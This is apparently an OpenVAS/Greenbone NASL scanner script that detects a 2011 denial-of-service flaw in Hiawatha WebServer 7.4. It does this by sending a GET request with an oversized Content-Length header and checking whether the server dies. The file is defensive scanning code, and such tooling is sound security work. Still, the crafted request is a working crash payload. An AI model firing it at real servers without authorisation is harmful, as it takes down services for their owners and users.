# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802007");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-03-16 15:16:52 +0100 (Wed, 16 Mar 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("Hiawatha WebServer 'Content-Length' Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Hiawatha/banner");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16939/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/99021/DCA-2011-0006.txt");
  script_xref(name:"URL", value:"https://www.hiawatha-webserver.org/weblog/16");

  script_tag(name:"impact", value:"Successful exploitation could allow remote unauthenticated
  attackers to cause a denial of service or possibly execute arbitrary code.");

  script_tag(name:"affected", value:"Hiawatha Webserver Version 7.4. Other versions may also be
  affected.");

  script_tag(name:"insight", value:"The flaw is due to the way Hiawatha web server validates
  requests with a bigger 'Content-Length' causing application crash.");

  script_tag(name:"solution", value:"Vendor has released a workaround to fix the issue, please see
  the references for details on a workaround.");

  script_tag(name:"summary", value:"Hiawatha Web Server is prone to a denial of service vulnerability.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "Server: Hiawatha" >!< banner)
  exit(0);

host = http_host_name(port:port);

req = string('GET / HTTP/1.1\r\n',
             'Host: ' + host + '\r\n',
             'Content-Length: 2147483599\r\n\r\n');
http_send_recv(port:port, data:req);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
